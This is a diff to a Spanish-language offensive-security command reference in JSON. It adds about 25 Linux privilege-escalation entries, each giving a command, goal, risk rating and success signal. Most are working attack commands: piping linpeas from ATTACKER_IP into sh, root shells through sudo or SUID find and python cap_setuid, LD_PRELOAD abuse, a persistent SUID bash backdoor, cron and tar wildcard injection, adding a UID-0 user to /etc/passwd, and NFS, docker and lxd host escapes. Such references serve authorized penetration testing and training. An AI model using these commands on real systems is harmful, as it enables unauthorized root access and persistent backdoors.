@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 61
+    "totalCommandMetadata": 86
   },
   "tags": [
     "active-directory",
@@ -9403,6 +9403,587 @@
       "successSignal": "Obtienes el hash de administrator para PtH.",
       "commonErrors": [
         "Reloj desincronizado (Kerberos)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
+      "objective": "Buscar directorios donde puedes escribir",
+      "tool": "find",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Lista de carpetas escribibles por tu usuario.",
+      "successSignal": "Aparecen rutas interesantes (cron, web, /etc/*) donde soltar payloads.",
+      "commonErrors": [
+        "Casi todo es /tmp: filtra el ruido con grep"
+      ],
+      "alternative": "linpeas",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "systemctl list-timers 2>/dev/null",
+      "objective": "Listar timers de systemd (cron moderno)",
+      "tool": "systemctl",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Timers activos y el servicio/script que disparan.",
+      "successSignal": "Ves un timer que ejecuta un script que puedes modificar.",
+      "commonErrors": [
+        "Ningun timer apunta a algo escribible"
+      ],
+      "alternative": "cat /etc/crontab",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
+      "objective": "Ejecutar linpeas sin tocar disco",
+      "tool": "linpeas",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Servidor HTTP tuyo sirviendo linpeas.sh"
+      ],
+      "expectedOutput": "Informe con vectores marcados en rojo/amarillo.",
+      "successSignal": "linpeas resalta un SUID, cron o cap explotable (99% PE).",
+      "commonErrors": [
+        "Sin salida a tu IP",
+        "curl/wget no instalados en el objetivo"
+      ],
+      "alternative": "wget ... -O /tmp/lp.sh",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "./pspy64",
+      "objective": "Ver procesos y cron sin ser root",
+      "tool": "pspy",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Flujo en vivo de comandos que lanza el sistema (incluido cron de root).",
+      "successSignal": "Ves a root ejecutar un script en intervalos: ahi esta el vector.",
+      "commonErrors": [
+        "No se ejecuta nada interesante mientras miras (espera un ciclo)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "sudo find . -exec /bin/sh \\; -quit",
+      "objective": "Escapar a root via sudo find (GTFOBins)",
+      "tool": "sudo",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "sudo -l permite ejecutar find como root"
+      ],
+      "expectedOutput": "Una shell root desde el propio find.",
+      "successSignal": "Prompt # (root) sin pedir contrasena.",
+      "commonErrors": [
+        "find no esta en tu sudo -l"
+      ],
+      "alternative": "GTFOBins del binario que si tengas",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "sudo LD_PRELOAD=/tmp/x.so <binario>",
+      "objective": "Cargar una lib maliciosa via LD_PRELOAD",
+      "tool": "sudo",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "sudo -l muestra env_keep+=LD_PRELOAD"
+      ],
+      "expectedOutput": "El binario carga tu .so y ejecuta tu codigo como root.",
+      "successSignal": "Tu constructor de la lib abre una shell root.",
+      "commonErrors": [
+        "LD_PRELOAD no esta en env_keep",
+        "sudo lo ignora por seguridad"
+      ],
+      "alternative": "LD_LIBRARY_PATH",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "objective": "Enumerar binarios SUID",
+      "tool": "find",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Binarios que corren con el UID de su dueno (a menudo root).",
+      "successSignal": "Aparece un SUID no estandar o uno con entrada en GTFOBins.",
+      "commonErrors": [
+        "Solo salen SUID normales (passwd, sudo, ping)"
+      ],
+      "alternative": "getcap -r /",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "/usr/bin/find . -exec /bin/sh -p \\; -quit",
+      "objective": "Explotar un find SUID conservando privilegios",
+      "tool": "find",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "find tiene el bit SUID de root"
+      ],
+      "expectedOutput": "Shell con EUID root (-p evita que se descarte).",
+      "successSignal": "id muestra euid=0.",
+      "commonErrors": [
+        "Sin -p la shell baja privilegios"
+      ],
+      "alternative": "GTFOBins (SUID) del binario concreto",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
+      "objective": "Crear una bash SUID de root (backdoor)",
+      "tool": "bash",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "root",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Ejecutas esto ya como root (cron/SUID) para persistir"
+      ],
+      "expectedOutput": "Una copia de bash con SUID que da root al instante.",
+      "successSignal": "/tmp/rootbash -p abre shell con euid=0.",
+      "commonErrors": [
+        "Se ejecuto sin privilegios: el chmod +s no pega root"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "getcap -r / 2>/dev/null",
+      "objective": "Enumerar capabilities de ficheros",
+      "tool": "getcap",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Binarios con capabilities (cap_setuid, cap_dac_read_search...).",
+      "successSignal": "Aparece python/perl con cap_setuid+ep: root directo.",
+      "commonErrors": [
+        "getcap no instalado",
+        "ninguna capability peligrosa"
+      ],
+      "alternative": "find SUID",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+      "objective": "Usar cap_setuid de python para ser root",
+      "tool": "python",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "python3 tiene cap_setuid+ep (via getcap)"
+      ],
+      "expectedOutput": "setuid(0) tiene exito y abre una shell root.",
+      "successSignal": "id muestra uid=0.",
+      "commonErrors": [
+        "El binario no tiene la capability: setuid falla con permiso denegado"
+      ],
+      "alternative": "perl con setuid",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "python3 -c 'import sys; print(sys.path)'",
+      "objective": "Ver el orden de busqueda de modulos de python",
+      "tool": "python",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Lista de rutas donde python importa modulos, en orden.",
+      "successSignal": "Una ruta escribible aparece antes que la del modulo real (hijack posible).",
+      "commonErrors": [
+        "Ninguna ruta del sys.path es escribible por ti"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null",
+      "objective": "Buscar scripts/modulos python escribibles",
+      "tool": "find",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Ficheros .py que puedes modificar.",
+      "successSignal": "Un .py que ejecuta root (cron/servicio) es escribible por ti.",
+      "commonErrors": [
+        "Solo salen .py tuyos sin valor"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py",
+      "objective": "Secuestrar un modulo python que importa root",
+      "tool": "python",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Un script de root importa ese modulo desde una ruta escribible"
+      ],
+      "expectedOutput": "Cuando root ejecute el script, corre tu codigo.",
+      "successSignal": "Aparece una bash root (o tu payload) al siguiente ciclo.",
+      "commonErrors": [
+        "El script no importa tu modulo o no lo corre root"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "cat /etc/crontab; ls -la /etc/cron.*",
+      "objective": "Enumerar tareas cron del sistema",
+      "tool": "cron",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Trabajos cron y los scripts/carpetas que ejecutan.",
+      "successSignal": "Un cron de root llama a un script escribible o con wildcard.",
+      "commonErrors": [
+        "Cron sin nada explotable (todo de root y no escribible)"
+      ],
+      "alternative": "pspy",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "echo 'chmod +s /bin/bash' >> script_escribible.sh",
+      "objective": "Inyectar en un script de cron que corre root",
+      "tool": "cron",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "root ejecuta ese script por cron y tu puedes escribirlo"
+      ],
+      "expectedOutput": "En el proximo ciclo root pone SUID a bash.",
+      "successSignal": "/bin/bash -p da shell root tras dispararse el cron.",
+      "commonErrors": [
+        "El script no lo ejecuta root o no es escribible"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh'",
+      "objective": "Inyeccion por wildcard en tar (cron)",
+      "tool": "tar",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Un cron de root hace tar * en un dir escribible por ti"
+      ],
+      "expectedOutput": "tar interpreta los ficheros como flags y ejecuta tu script.",
+      "successSignal": "privesc.sh corre como root al dispararse el cron.",
+      "commonErrors": [
+        "El cron no usa wildcard o no es tar"
+      ],
+      "alternative": "wildcard con chown/rsync",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "openssl passwd -1 -salt hax pass123",
+      "objective": "Generar un hash de contrasena para /etc/passwd",
+      "tool": "openssl",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Un hash MD5-crypt ($1$...) listo para pegar.",
+      "successSignal": "Tienes el hash para inyectar un usuario root.",
+      "commonErrors": [
+        "Formato de hash que /etc/passwd no acepta"
+      ],
+      "alternative": "mkpasswd",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t",
+      "objective": "Anadir un usuario root si /etc/passwd es escribible",
+      "tool": "passwd",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "/etc/passwd escribible por tu usuario"
+      ],
+      "expectedOutput": "Un usuario nuevo con UID 0 y contrasena conocida.",
+      "successSignal": "su r00t con tu clave te da shell root.",
+      "commonErrors": [
+        "/etc/passwd no es escribible (lo normal)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "cat /etc/exports",
+      "objective": "Ver los shares NFS exportados",
+      "tool": "nfs",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Rutas exportadas y sus opciones.",
+      "successSignal": "Un export tiene no_root_squash (root remoto = root local).",
+      "commonErrors": [
+        "root_squash activo: no explotable asi"
+      ],
+      "alternative": "showmount -e",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash",
+      "objective": "Explotar NFS no_root_squash para SUID root",
+      "tool": "nfs",
+      "environment": "attacker",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "root",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Eres root en tu maquina y el export tiene no_root_squash"
+      ],
+      "expectedOutput": "Una bash SUID escrita como root en el share.",
+      "successSignal": "En el objetivo, /share/bash -p da shell root.",
+      "commonErrors": [
+        "root_squash mapea tu root a nobody"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "uname -a; cat /etc/os-release",
+      "objective": "Identificar kernel y distro para exploits",
+      "tool": "uname",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Version exacta de kernel y distribucion.",
+      "successSignal": "El kernel es viejo y tiene un CVE conocido (ej. DirtyPipe).",
+      "commonErrors": [
+        "Kernel parcheado sin exploit publico"
+      ],
+      "alternative": "linpeas",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "searchsploit linux kernel <version>",
+      "objective": "Buscar exploits de kernel para esa version",
+      "tool": "searchsploit",
+      "environment": "attacker",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Saber la version del kernel (uname -a)"
+      ],
+      "expectedOutput": "Exploits locales que apliquen a ese kernel.",
+      "successSignal": "Aparece un PoC de LPE para tu version exacta.",
+      "commonErrors": [
+        "Nada aplicable o solo DoS"
+      ],
+      "alternative": "google CVE + kernel",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "objective": "Privesc por pertenecer al grupo docker",
+      "tool": "docker",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Tu usuario esta en el grupo docker (id)"
+      ],
+      "expectedOutput": "Monta el disco del host y te da shell root dentro.",
+      "successSignal": "chroot /mnt te deja como root sobre el sistema real.",
+      "commonErrors": [
+        "No estas en el grupo docker o no hay imagen"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "linux-privesc",
+      "command": "lxc init privesc r00t -c security.privileged=true",
+      "objective": "Crear contenedor privilegiado (grupo lxd)",
+      "tool": "lxc",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Estar en el grupo lxd y tener una imagen importada"
+      ],
+      "expectedOutput": "Un contenedor privilegiado que luego monta el host.",
+      "successSignal": "Tras montar / y exec, eres root del host.",
+      "commonErrors": [
+        "No estas en lxd o falta la imagen alpine"
       ],
       "alternative": "",
       "checkedVersion": "2025.1",
